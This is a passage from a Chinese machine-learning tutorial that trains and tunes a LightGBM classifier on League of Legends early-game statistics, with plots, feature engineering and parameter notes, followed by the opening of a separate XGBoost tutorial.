redCSPerMin redGoldPerMin 0 4519157822 0 28 2 1 9 6 11 0 0 ... 0 16567 6.8 17047 197 55 -643 8 19.7 1656.7 1 4523371949 0 12 1 0 5 5 5 0 0 ... 1 17620 6.8 17438 240 52 2908 1173 24.0 1762.0 2 4521474530 0 15 0 0 7 11 4 1 1 ... 0 17285 6.8 17254 203 28 1172 1033 20.3 1728.5 3 4524384067 0 43 1 0 4 5 5 1 0 ... 0 16478 7.0 17961 235 47 1321 7 23.5 1647.8 4 4436033771 0 75 4 0 6 6 6 0 0 ... 0 17404 7.0 18313 225 67 1004 -230 22.5 1740.4 5 rows × 40 columns 1df.tail() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; gameId blueWins blueWardsPlaced blueWardsDestroyed blueFirstBlood blueKills blueDeaths blueAssists blueEliteMonsters blueDragons ... redTowersDestroyed redTotalGold redAvgLevel redTotalExperience redTotalMinionsKilled redTotalJungleMinionsKilled redGoldDiff redExperienceDiff redCSPerMin redGoldPerMin 9874 4527873286 1 17 2 1 7 4 5 1 1 ... 0 15246 6.8 16498 229 34 -2519 -2469 22.9 1524.6 9875 4527797466 1 54 0 0 6 4 8 1 1 ... 0 15456 7.0 18367 206 56 -782 -888 20.6 1545.6 9876 4527713716 0 23 1 0 6 7 5 0 0 ... 0 18319 7.4 19909 261 60 2416 1877 26.1 1831.9 9877 4527628313 0 14 4 1 2 3 3 1 1 ... 0 15298 7.2 18314 247 40 839 1085 24.7 1529.8 9878 4523772935 1 18 0 1 6 6 5 0 0 ... 0 15339 6.8 17379 201 46 -927 58 20.1 1533.9 5 rows × 40 columns 123## 标注标签并利用value_counts函数查看训练集标签的数量y = df.blueWinsy.value_counts() 0 4949 1 4930 Name: blueWins, dtype: int64 123## 标注特征列drop_cols = [&#x27;gameId&#x27;,&#x27;blueWins&#x27;]x = df.drop(drop_cols, axis=1) 12## 对于特征进行一些统计描述x.describe() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; blueWardsPlaced blueWardsDestroyed blueFirstBlood blueKills blueDeaths blueAssists blueEliteMonsters blueDragons blueHeralds blueTowersDestroyed ... redTowersDestroyed redTotalGold redAvgLevel redTotalExperience redTotalMinionsKilled redTotalJungleMinionsKilled redGoldDiff redExperienceDiff redCSPerMin redGoldPerMin count 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 ... 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 9879.000000 mean 22.288288 2.824881 0.504808 6.183925 6.137666 6.645106 0.549954 0.361980 0.187974 0.051422 ... 0.043021 16489.041401 6.925316 17961.730438 217.349226 51.313088 -14.414111 33.620306 21.734923 1648.904140 std 18.019177 2.174998 0.500002 3.011028 2.933818 4.064520 0.625527 0.480597 0.390712 0.244369 ... 0.216900 1490.888406 0.305311 1198.583912 21.911668 10.027885 2453.349179 1920.370438 2.191167 149.088841 min 5.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 0.000000 ... 0.000000 11212.000000 4.800000 10465.000000 107.000000 4.000000 -11467.000000 -8348.000000 10.700000 1121.200000 25% 14.000000 1.000000 0.000000 4.000000 4.000000 4.000000 0.000000 0.000000 0.000000 0.000000 ... 0.000000 15427.500000 6.800000 17209.500000 203.000000 44.000000 -1596.000000 -1212.000000 20.300000 1542.750000 50% 16.000000 3.000000 1.000000 6.000000 6.000000 6.000000 0.000000 0.000000 0.000000 0.000000 ... 0.000000 16378.000000 7.000000 17974.000000 218.000000 51.000000 -14.000000 28.000000 21.800000 1637.800000 75% 20.000000 4.000000 1.000000 8.000000 8.000000 9.000000 1.000000 1.000000 0.000000 0.000000 ... 0.000000 17418.500000 7.200000 18764.500000 233.000000 57.000000 1585.500000 1290.500000 23.300000 1741.850000 max 250.000000 27.000000 1.000000 22.000000 22.000000 29.000000 2.000000 1.000000 1.000000 4.000000 ... 2.000000 22732.000000 8.200000 22269.000000 289.000000 92.000000 10830.000000 9333.000000 28.900000 2273.200000 8 rows × 38 columns 我们发现不同对局中插眼数和拆眼数的取值范围存在明显差距，甚至有前十分钟插了 250 个眼的异常值。 我们发现 EliteMonsters 的取值相当于 Deagons + Heralds。 我们发现 TotalGold 等变量在大部分对局中差距不大。 我们发现两支队伍的经济差和经验差是相反数。 我们发现红队和蓝队拿到首次击杀的概率大概都是 50% 12345## 根据上面的描述，我们可以去除一些重复变量，比如只要知道蓝队是否拿到一血，我们就知道红队有没有拿到，可以去除红队的相关冗余数据。drop_cols = [&#x27;redFirstBlood&#x27;,&#x27;redKills&#x27;,&#x27;redDeaths&#x27; ,&#x27;redGoldDiff&#x27;,&#x27;redExperienceDiff&#x27;, &#x27;blueCSPerMin&#x27;, &#x27;blueGoldPerMin&#x27;,&#x27;redCSPerMin&#x27;,&#x27;redGoldPerMin&#x27;]x.drop(drop_cols, axis=1, inplace=True) Step4: 可视化描述 1234567891011121314151617181920212223data = xdata_std = (data - data.mean()) / data.std()data = pd.concat([y, data_std.iloc[:, 0:9]], axis=1)data = pd.melt(data, id_vars=&#x27;blueWins&#x27;, var_name=&#x27;Features&#x27;, value_name=&#x27;Values&#x27;)fig, ax = plt.subplots(1,2,figsize=(15,5))# 绘制小提琴图sns.violinplot(x=&#x27;Features&#x27;, y=&#x27;Values&#x27;, hue=&#x27;blueWins&#x27;, data=data, split=True, inner=&#x27;quart&#x27;, ax=ax[0], palette=&#x27;Blues&#x27;)fig.autofmt_xdate(rotation=45)data = xdata_std = (data - data.mean()) / data.std()data = pd.concat([y, data_std.iloc[:, 9:18]], axis=1)data = pd.melt(data, id_vars=&#x27;blueWins&#x27;, var_name=&#x27;Features&#x27;, value_name=&#x27;Values&#x27;)# 绘制小提琴图sns.violinplot(x=&#x27;Features&#x27;, y=&#x27;Values&#x27;, hue=&#x27;blueWins&#x27;, data=data, split=True, inner=&#x27;quart&#x27;, ax=ax[1], palette=&#x27;Blues&#x27;)fig.autofmt_xdate(rotation=45)plt.show() ​ ​ 提琴图 (Violin Plot) 是用来展示多组数据的分布状态以及概率密度。这种图表结合了箱形图和密度图的特征，主要用来显示数据的分布形状。 从图中我们可以看出： 击杀英雄数量越多更容易赢，死亡数量越多越容易输（bluekills 与 bluedeaths 左右的区别）。 助攻数量与击杀英雄数量形成的图形状类似，说明他们对游戏结果的影响差不多。 一血的取得情况与获胜有正相关，但是相关性不如击杀英雄数量明显。 经济差与经验差对于游戏胜负的影响较小。 击杀野怪数量对游戏胜负的影响并不大。 123plt.figure(figsize=(18,14))sns.heatmap(round(x.corr(),2), cmap=&#x27;Blues&#x27;, annot=True)plt.show() ​ ​ 同时我们画出各个特征之间的相关性热力图，颜色越深代表特征之间相关性越强，我们剔除那些相关性较强的冗余特征。 123# 去除冗余特征drop_cols = [&#x27;redAvgLevel&#x27;,&#x27;blueAvgLevel&#x27;]x.drop(drop_cols, axis=1, inplace=True) 123456789101112131415sns.set(style=&#x27;whitegrid&#x27;, palette=&#x27;muted&#x27;)# 构造两个新特征x[&#x27;wardsPlacedDiff&#x27;] = x[&#x27;blueWardsPlaced&#x27;] - x[&#x27;redWardsPlaced&#x27;]x[&#x27;wardsDestroyedDiff&#x27;] = x[&#x27;blueWardsDestroyed&#x27;] - x[&#x27;redWardsDestroyed&#x27;]data = x[[&#x27;blueWardsPlaced&#x27;,&#x27;blueWardsDestroyed&#x27;,&#x27;wardsPlacedDiff&#x27;,&#x27;wardsDestroyedDiff&#x27;]].sample(1000)data_std = (data - data.mean()) / data.std()data = pd.concat([y, data_std], axis=1)data = pd.melt(data, id_vars=&#x27;blueWins&#x27;, var_name=&#x27;Features&#x27;, value_name=&#x27;Values&#x27;)plt.figure(figsize=(10,6))sns.swarmplot(x=&#x27;Features&#x27;, y=&#x27;Values&#x27;, hue=&#x27;blueWins&#x27;, data=data)plt.xticks(rotation=45)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.8% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 8.2% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 6.7% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.7% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) 我们画出了插眼数量的散点图，发现不存在插眼数量与游戏胜负间的显著规律。猜测由于钻石分段以上在哪插眼在哪好排眼都是套路，所以数据中前十分钟插眼数拔眼数对游戏的影响不大。所以我们暂时先把这些特征去掉。 1234## 去除和眼位相关的特征drop_cols = [&#x27;blueWardsPlaced&#x27;,&#x27;blueWardsDestroyed&#x27;,&#x27;wardsPlacedDiff&#x27;, &#x27;wardsDestroyedDiff&#x27;,&#x27;redWardsPlaced&#x27;,&#x27;redWardsDestroyed&#x27;]x.drop(drop_cols, axis=1, inplace=True) 12345x[&#x27;killsDiff&#x27;] = x[&#x27;blueKills&#x27;] - x[&#x27;blueDeaths&#x27;]x[&#x27;assistsDiff&#x27;] = x[&#x27;blueAssists&#x27;] - x[&#x27;redAssists&#x27;]x[[&#x27;blueKills&#x27;,&#x27;blueDeaths&#x27;,&#x27;blueAssists&#x27;,&#x27;killsDiff&#x27;,&#x27;assistsDiff&#x27;,&#x27;redAssists&#x27;]].hist(figsize=(12,10), bins=20)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\pandas\\plotting\\_matplotlib\\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead. if ax.is_first_col(): 我们发现击杀、死亡与助攻数的数据分布差别不大。但是击杀减去死亡、助攻减去死亡的分布与原分布差别很大，因此我们新构造这么两个特征。 123456789data = x[[&#x27;blueKills&#x27;,&#x27;blueDeaths&#x27;,&#x27;blueAssists&#x27;,&#x27;killsDiff&#x27;,&#x27;assistsDiff&#x27;,&#x27;redAssists&#x27;]].sample(1000)data_std = (data - data.mean()) / data.std()data = pd.concat([y, data_std], axis=1)data = pd.melt(data, id_vars=&#x27;blueWins&#x27;, var_name=&#x27;Features&#x27;, value_name=&#x27;Values&#x27;)plt.figure(figsize=(10,6))sns.swarmplot(x=&#x27;Features&#x27;, y=&#x27;Values&#x27;, hue=&#x27;blueWins&#x27;, data=data)plt.xticks(rotation=45)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.9% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 8.0% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.5% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.1% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 6.2% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\seaborn\\categorical.py:1296: UserWarning: 7.4% of the points cannot be placed; you may want to decrease the size of the markers or use stripplot. warnings.warn(msg, UserWarning) 从上图我们可以发现击杀数与死亡数与助攻数，以及我们构造的特征对数据都有较好的分类能力。 123456data = pd.concat([y, x], axis=1).sample(500)sns.pairplot(data, vars=[&#x27;blueKills&#x27;,&#x27;blueDeaths&#x27;,&#x27;blueAssists&#x27;,&#x27;killsDiff&#x27;,&#x27;assistsDiff&#x27;,&#x27;redAssists&#x27;], hue=&#x27;blueWins&#x27;)plt.show() ​ ​ 一些特征两两组合后对于数据的划分能力也有提升。 123456789101112131415161718192021x[&#x27;dragonsDiff&#x27;] = x[&#x27;blueDragons&#x27;] - x[&#x27;redDragons&#x27;]x[&#x27;heraldsDiff&#x27;] = x[&#x27;blueHeralds&#x27;] - x[&#x27;redHeralds&#x27;]x[&#x27;eliteDiff&#x27;] = x[&#x27;blueEliteMonsters&#x27;] - x[&#x27;redEliteMonsters&#x27;]data = pd.concat([y, x], axis=1)eliteGroup = data.groupby([&#x27;eliteDiff&#x27;])[&#x27;blueWins&#x27;].mean()dragonGroup = data.groupby([&#x27;dragonsDiff&#x27;])[&#x27;blueWins&#x27;].mean()heraldGroup = data.groupby([&#x27;heraldsDiff&#x27;])[&#x27;blueWins&#x27;].mean()fig, ax = plt.subplots(1,3, figsize=(15,4))eliteGroup.plot(kind=&#x27;bar&#x27;, ax=ax[0])dragonGroup.plot(kind=&#x27;bar&#x27;, ax=ax[1])heraldGroup.plot(kind=&#x27;bar&#x27;, ax=ax[2])print(eliteGroup)print(dragonGroup)print(heraldGroup)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\pandas\\plotting\\_matplotlib\\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead. if ax.is_first_col(): eliteDiff -2 0.286301 -1 0.368772 0 0.500683 1 0.632093 2 0.735211 Name: blueWins, dtype: float64 dragonsDiff -1 0.374173 0 0.500000 1 0.640940 Name: blueWins, dtype: float64 heraldsDiff -1 0.387729 0 0.498680 1 0.595046 Name: blueWins, dtype: float64 我们构造了两队之间是否拿到龙、是否拿到峡谷先锋、击杀大型野怪的数量差值，发现在游戏的前期拿到龙比拿到峡谷先锋更容易获得胜利。拿到大型野怪的数量和胜率也存在着强相关。 1234567891011121314151617x[&#x27;towerDiff&#x27;] = x[&#x27;blueTowersDestroyed&#x27;] - x[&#x27;redTowersDestroyed&#x27;]data = pd.concat([y, x], axis=1)towerGroup = data.groupby([&#x27;towerDiff&#x27;])[&#x27;blueWins&#x27;]print(towerGroup.count())print(towerGroup.mean())fig, ax = plt.subplots(1,2,figsize=(15,5))towerGroup.mean().plot(kind=&#x27;line&#x27;, ax=ax[0])ax[0].set_title(&#x27;Proportion of Blue Wins&#x27;)ax[0].set_ylabel(&#x27;Proportion&#x27;)towerGroup.count().plot(kind=&#x27;line&#x27;, ax=ax[1])ax[1].set_title(&#x27;Count of Towers Destroyed&#x27;)ax[1].set_ylabel(&#x27;Count&#x27;) towerDiff -2 27 -1 347 0 9064 1 406 2 28 3 6 4 1 Name: blueWins, dtype: int64 towerDiff -2 0.185185 -1 0.216138 0 0.498124 1 0.741379 2 0.964286 3 1.000000 4 1.000000 Name: blueWins, dtype: float64 c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\pandas\\plotting\\_matplotlib\\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead. if ax.is_first_col(): c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\pandas\\plotting\\_matplotlib\\tools.py:400: MatplotlibDeprecationWarning: The is_first_col function was deprecated in Matplotlib 3.4 and will be removed two minor releases later. Use ax.get_subplotspec().is_first_col() instead. if ax.is_first_col(): Text(0, 0.5, 'Count') ​ ​ 推塔是英雄联盟这个游戏的核心，因此推塔数量可能与游戏的胜负有很大关系。我们绘图发现，尽管前十分钟推掉第一座防御塔的概率很低，但是一旦某只队伍推掉第一座防御塔，获得游戏的胜率将大大增加。 Step5: 利用 LightGBM 进行训练与预测 123456789101112## 为了正确评估模型性能，将数据划分为训练集和测试集，并在训练集上训练模型，在测试集上验证模型性能。from sklearn.model_selection import train_test_split## 选择其类别为0和1的样本 （不包括类别为2的样本）data_target_part = ydata_features_part = x## 测试集大小为20%， 80%/20%分x_train, x_test, y_train, y_test = train_test_split(data_features_part, data_target_part, test_size = 0.2, random_state = 2020) 123456## 导入LightGBM模型from lightgbm.sklearn import LGBMClassifier## 定义 LightGBM 模型 clf = LGBMClassifier()# 在训练集上训练LightGBM模型clf.fit(x_train, y_train) LGBMClassifier() 12345678910111213141516171819## 在训练集和测试集上分布利用训练好的模型进行预测train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)from sklearn import metrics## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The accuracy of the Logistic Regression is: 0.8447425028470201 The accuracy of the Logistic Regression is: 0.722165991902834 The confusion matrix result: [[714 300] [249 713]] 我们可以发现共有 718 + 707 个样本预测正确，306 + 245 个样本预测错误。 Step6: 利用 LightGBM 进行特征选择 LightGBM 的特征选择属于特征选择中的嵌入式方法，在 LightGBM 中可以用属性 feature_importances_去查看特征的重要度。 1sns.barplot(y=data_features_part.columns, x=clf.feature_importances_) &lt;AxesSubplot:&gt; ​ ​ 总经济差距等特征，助攻数量、击杀死亡数量等特征都具有很大的作用。插眼数、推塔数对模型的影响并不大。 初次之外，我们还可以使用 LightGBM 中的下列重要属性来评估特征的重要性。 gain: 当利用特征做划分的时候的评价基尼指数 split: 是以特征用到的次数来评价 12345678910111213141516171819202122from sklearn.metrics import accuracy_scorefrom lightgbm import plot_importancedef estimate(model,data): #sns.barplot(data.columns,model.feature_importances_) ax1=plot_importance(model,importance_type=&quot;gain&quot;) ax1.set_title(&#x27;gain&#x27;) ax2=plot_importance(model, importance_type=&quot;split&quot;) ax2.set_title(&#x27;split&#x27;) plt.show()def classes(data,label,test): model=LGBMClassifier() model.fit(data,label) ans=model.predict(test) estimate(model, data) return ans ans=classes(x_train,y_train,x_test)pre=accuracy_score(y_test, ans)print(&#x27;acc=&#x27;,accuracy_score(y_test,ans)) ​ ​ acc= 0.722165991902834 这些图同样可以帮助我们更好的了解其他重要特征。 Step7: 通过调整参数获得更好的效果 LightGBM 中包括但不限于下列对模型影响较大的参数： learning_rate: 有时也叫作 eta，系统默认值为 0.3。每一步迭代的步长，很重要。太大了运行准确率不高，太小了运行速度慢。 num_leaves：系统默认为 32。这个参数控制每棵树中最大叶子节点数量。 feature_fraction：系统默认值为 1。我们一般设置成 0.8 左右。用来控制每棵随机采样的列数的占比 (每一列是一个特征)。 max_depth： 系统默认值为 6，我们常用 3-10 之间的数字。这个值为树的最大深度。这个值是用来控制过拟合的。max_depth 越大，模型学习的更加具体。 调节模型参数的方法有贪心算法、网格调参、贝叶斯调参等。这里我们采用网格调参，它的基本思想是穷举搜索：在所有候选的参数选择中，通过循环遍历，尝试每一种可能性，表现最好的参数就是最终的结果 123456789101112131415161718## 从sklearn库中导入网格调参函数from sklearn.model_selection import GridSearchCV## 定义参数取值范围learning_rate = [0.1, 0.3, 0.6]feature_fraction = [0.5, 0.8, 1]num_leaves = [16, 32, 64]max_depth = [-1,3,5,8]parameters = &#123; &#x27;learning_rate&#x27;: learning_rate, &#x27;feature_fraction&#x27;:feature_fraction, &#x27;num_leaves&#x27;: num_leaves, &#x27;max_depth&#x27;: max_depth&#125;model = LGBMClassifier(n_estimators = 50)## 进行网格搜索clf = GridSearchCV(model, parameters, cv=3, scoring=&#x27;accuracy&#x27;,verbose=3, n_jobs=-1)clf = clf.fit(x_train, y_train) Fitting 3 folds for each of 108 candidates, totalling 324 fits [LightGBM] [Warning] feature_fraction is set=1, colsample_bytree=1.0 will be ignored. Current value: feature_fraction=1 123## 网格搜索后的最好参数为clf.best_params_ &#123;'feature_fraction': 1, 'learning_rate': 0.1, 'max_depth': 3, 'num_leaves': 16&#125; 123456789101112131415161718192021222324252627## 在训练集和测试集上分布利用最好的模型参数进行预测## 定义带参数的 LightGBM模型 clf = LGBMClassifier(feature_fraction = 1, learning_rate = 0.1, max_depth= 3, num_leaves = 16)# 在训练集上训练LightGBM模型clf.fit(x_train, y_train)train_predict = clf.predict(x_train)test_predict = clf.predict(x_test)## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict))## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() [LightGBM] [Warning] feature_fraction is set=1, colsample_bytree=1.0 will be ignored. Current value: feature_fraction=1 The accuracy of the Logistic Regression is: 0.7462988738453752 The accuracy of the Logistic Regression is: 0.7302631578947368 The confusion matrix result: [[724 294] [239 719]] 原本有 306 + 245 个错误，现在有 294 + 239 个错误，带来了明显的正确率提升。 # 2.4 重要知识点 # 2.4.1 LightGBM 的重要参数 # 2.4.1.1 基本参数调整 num_leaves 参数 这是控制树模型复杂度的主要参数，一般的我们会使 num_leaves 小于（2 的 max_depth 次方），以防止过拟合。由于 LightGBM 是 leaf-wise 建树与 XGBoost 的 depth-wise 建树方法不同，num_leaves 比 depth 有更大的作用。、 min_data_in_leaf 这是处理过拟合问题中一个非常重要的参数。它的值取决于训练数据的样本个树和 num_leaves 参数。将其设置的较大可以避免生成一个过深的树，但有可能导致欠拟合。实际应用中，对于大数据集，设置其为几百或几千就足够了. max_depth 树的深度，depth 的概念在 leaf-wise 树中并没有多大作用，因为并不存在一个从 leaves 到 depth 的合理映射。 # 2.4.1.2 针对训练速度的参数调整 通过设置 bagging_fraction 和 bagging_freq 参数来使用 bagging 方法。 通过设置 feature_fraction 参数来使用特征的子抽样。 选择较小的 max_bin 参数。 使用 save_binary 在未来的学习过程对数据加载进行加速。 # 2.4.1.3 针对准确率的参数调整 使用较大的 max_bin （学习速度可能变慢） 使用较小的 learning_rate 和较大的 num_iterations 使用较大的 num_leaves （可能导致过拟合） 使用更大的训练数据 尝试 dart 模式 # 2.4.1.4 针对过拟合的参数调整 使用较小的 max_bin 使用较小的 num_leaves 使用 min_data_in_leaf 和 min_sum_hessian_in_leaf 通过设置 bagging_fraction 和 bagging_freq 来使用 bagging 通过设置 feature_fraction 来使用特征子抽样 使用更大的训练数据 使用 lambda_l1, lambda_l2 和 min_gain_to_split 来使用正则 尝试 max_depth 来避免生成过深的树 # 2.4.2 LightGBM 原理粗略讲解 LightGBM 底层实现了 GBDT 算法，并且添加了一系列的新特性： 基于直方图算法进行优化，使数据存储更加方便、运算更快、鲁棒性强、模型更加稳定等。 提出了带深度限制的 Leaf-wise 算法，抛弃了大多数 GBDT 工具使用的按层生长 (level-wise) 的决策树生长策略，而使用了带有深度限制的按叶子生长策略，可以降低误差，得到更好的精度。 提出了单边梯度采样算法，排除大部分小梯度的样本，仅用剩下的样本计算信息增益，它是一种在减少数据量和保证精度上平衡的算法。 提出了互斥特征捆绑算法，高维度的数据往往是稀疏的，这种稀疏性启发我们设计一种无损的方法来减少特征的维度。通常被捆绑的特征都是互斥的（即特征不会同时为非零值，像 one-hot），这样两个特征捆绑起来就不会丢失信息。 LightGBM 是基于 CART 树的集成模型，它的思想是串联多个决策树模型共同进行决策。 那么如何串联呢？LightGBM 采用迭代预测误差的方法串联。举个通俗的例子，我们现在需要预测一辆车价值 3000 元。我们构建决策树 1 训练后预测为 2600 元，我们发现有 400 元的误差，那么决策树 2 的训练目标为 400 元，但决策树 2 的预测结果为 350 元，还存在 50 元的误差就交给第三棵树…… 以此类推，每一颗树用来估计之前所有树的误差，最后所有树预测结果的求和就是最终预测结果！ LightGBM 的基模型是 CART 回归树，它有两个特点：（1）CART 树，是一颗二叉树。（2）回归树，最后拟合结果是连续值。 LightGBM 模型可以表示为以下形式，我们约定ft(x)f_t(x)ft​(x) 表示前 t 颗树的和，ht(x)h_t(x)ht​(x) 表示第ttt 颗决策树，模型定义如下： ft(x)=∑t=1Tht(x)f_t(x) = \\sum_{t=1}^Th_t(x) ft​(x)=t=1∑T​ht​(x) 由于模型递归生成，第ttt 步的模型由第t−1t−1t−1 步的模型形成，可以写成： ft(x)=ft−1(x)+ht(x)f_t(x)=f_{t-1}(x)+h_t(x) ft​(x)=ft−1​(x)+ht​(x) 每次需要加上的树ht(x)h_t(x)ht​(x) 是之前树求和的误差： rt,i=yi−fm−1(xi)r_{t,i} = y_i - f_{m-1}(x_i) rt,i​=yi​−fm−1​(xi​)","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于XGBoost的分类预测","slug":"机器学习/天池/基于XGBoost的分类预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:28:20.207Z","comments":true,"path":"2021/11/08/机器学习/天池/基于XGBoost的分类预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8EXGBoost%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 1. 实验室介绍 # 1.1 XGBoost 的介绍 XGBoost 是 2016 年由华盛顿大学陈天奇老师带领开发的一个可扩展机器学习系统。严格意义上讲 XGBoost 并不是一种模型，而是一个可供用户轻松解决分类、回归或排序问题的软件包。它内部实现了梯度提升树 (GBDT) 模型，并对模型中的算法进行了诸多优化，在取得高精度的同时又保持了极快的速度，在一段时间内成为了国内外数据挖掘、机器学习领域中的大规模杀伤性武器。 更重要的是，XGBoost 在系统优化和机器学习原理方面都进行了深入的考虑。毫不夸张的讲，XGBoost 提供的可扩展性，可移植性与准确性推动了机器学习计算限制的上限，该系统在单台机器上运行速度比当时流行解决方案快十倍以上，甚至在分布式系统中可以处理十亿级的数据。 XGBoost 的主要优点： 简单易用。相对其他机器学习库，用户可以轻松使用 XGBoost 并获得相当不错的效果。 高效可扩展。在处理大规模数据集时速度快效果好，对内存等硬件资源要求不高。 鲁棒性强。相对于深度学习模型不需要精细调参便能取得接近的效果。 XGBoost 内部实现提升树模型，可以自动处理缺失值。 XGBoost 的主要缺点： 相对于深度学习模型无法对时空位置建模，不能很好地捕获图像、语音、文本等高维数据。 在拥有海量训练数据，并能找到合适的深度学习模型时，深度学习的精度可以遥遥领先 XGBoost。 # 1.2 XGboost 的应用 XGBoost 在机器学习与数据挖掘领域有着极为广泛的应用。据统计在 2015 年 Kaggle 平台上 29 个获奖方案中，17 只队伍使用了 XGBoost；在 2015 年 KDD-Cup 中，前十名的队伍均使用了 XGBoost，且集成其他模型比不上调节 XGBoost 的参数所带来的提升。这些实实在在的例子都表明，XGBoost 在各种问题上都可以取得非常好的效果。 同时，XGBoost 还被成功应用在工业界与学术界的各种问题中。例如商店销售额预测、高能物理事件分类、web 文本分类；用户行为预测、运动检测、广告点击率预测、恶意软件分类、灾害风险预测、在线课程退学率预测。虽然领域相关的数据分析和特性工程在这些解决方案中也发挥了重要作用，但学习者与实践者对 XGBoost 的一致选择表明了这一软件包的影响力与重要性。 # 2. 实验室手册 # 2.1 学习目标 了解 XGBoost 的参数与相关知识 掌握 XGBoost 的 Python 调用并将其运用到天气数据集预测 # 2.2 代码流程 Part1 基于天气数据集的 XGBoost 分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看 Step4: 可视化描述 Step5: 对离散变量进行编码 Step6: 利用 XGBoost 进行训练与预测 Step7: 利用 XGBoost 进行特征选择 Step8: 通过调整参数获得更好的效果 # 2.3 算法实战 # 2.3.1 基于天气数据集的 XGBoost 分类实战 在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 